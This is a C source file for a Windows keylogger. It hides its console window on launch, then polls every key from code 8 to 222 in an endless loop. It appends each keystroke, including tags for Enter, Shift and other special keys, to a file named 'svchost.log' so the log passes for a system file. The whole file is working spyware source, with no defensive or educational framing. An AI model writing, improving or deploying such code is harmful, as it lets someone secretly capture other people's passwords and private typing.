
#include <stdio.h>
#include <windows.h>
#include <winuser.h>

#define BUFSIZE 80

int log_key(void);

int main(void)
{
    HWND stealth; /* creating stealth (window is not visible) */
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    return log_key();
}

int log_key(void)
{
    short c;
    while (1) /* inifinite loop */
    {
        Sleep(10); /* to prevent 100% cpu usage */
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                FILE *file;
                file = fopen("svchost.log", "a+");
                if (file == NULL)
                {
                    return 1;
                }
                if (file != NULL)
                {
                    if ((c >= 39) && (c <= 64))
                    {
                        fputc(c, file);
                    }
                    else if ((c > 64) && (c < 91))
                    {
                        c += 32;
                        fputc(c, file);
                    }
                    else
                    {
                        switch (c) // for non-alphanumeric
                        {
                        case VK_SPACE:
                            fputc(' ', file);
                            break;
                        case VK_SHIFT:
                            fputs("[SHIFT]", file);
                            break;
                        case VK_RETURN:
                            fputs("\n[ENTER]", file);
                            break;
                        case VK_BACK:
                            fputs("[BACKSPACE]", file);
                            break;
                        case VK_TAB:
                            fputs("[TAB]", file);
                            break;
                        case VK_CONTROL:
                            fputs("[CTRL]", file);
                            break;
                        case VK_DELETE:
                            fputs("[DEL]", file);
                            break;
                        case VK_OEM_1:
                            fputs("[;:]", file);
                            break;
                        case VK_OEM_2:
                            fputs("[/?]", file);
                            break;
                        case VK_OEM_3:
                            fputs("[`~]", file);
                            break;
                        case VK_OEM_4:
                            fputs("[ [{ ]", file);
                            break;
                        case VK_OEM_5:
                            fputs("[\\|]", file);
                            break;
                        case VK_OEM_6:
                            fputs("[ ]} ]", file);
                            break;
                        case VK_OEM_7:
                            fputs("['\"]", file);
                            break;
                        case VK_OEM_PLUS:
                            fputc('+', file);
                            break;
                        case VK_OEM_COMMA:
                            fputc(',', file);
                            break;
                        case VK_OEM_MINUS:
                            fputc('-', file);
                            break;
                        case VK_OEM_PERIOD:
                            fputc('.', file);
                            break;
                        case VK_NUMPAD0:
                            fputc('0', file);
                            break;
                        case VK_NUMPAD1:
                            fputc('1', file);
                            break;
                        case VK_NUMPAD2:
                            fputc('2', file);
                            break;
                        case VK_NUMPAD3:
                            fputc('3', file);
                            break;
                        case VK_NUMPAD4:
                            fputc('4', file);
                            break;
                        case VK_NUMPAD5:
                            fputc('5', file);
                            break;
                        case VK_NUMPAD6:
                            fputc('6', file);
                            break;
                        case VK_NUMPAD7:
                            fputc('7', file);
                            break;
                        case VK_NUMPAD8:
                            fputc('8', file);
                            break;
                        case VK_NUMPAD9:
                            fputc('9', file);
                            break;
                        case VK_CAPITAL:
                            fputs("[CAPS LOCK]", file);
                            break;
                        default:
                            break;
                        }
                    }
                    fclose(file);
                }
            }
        }
    }
    return 0;
}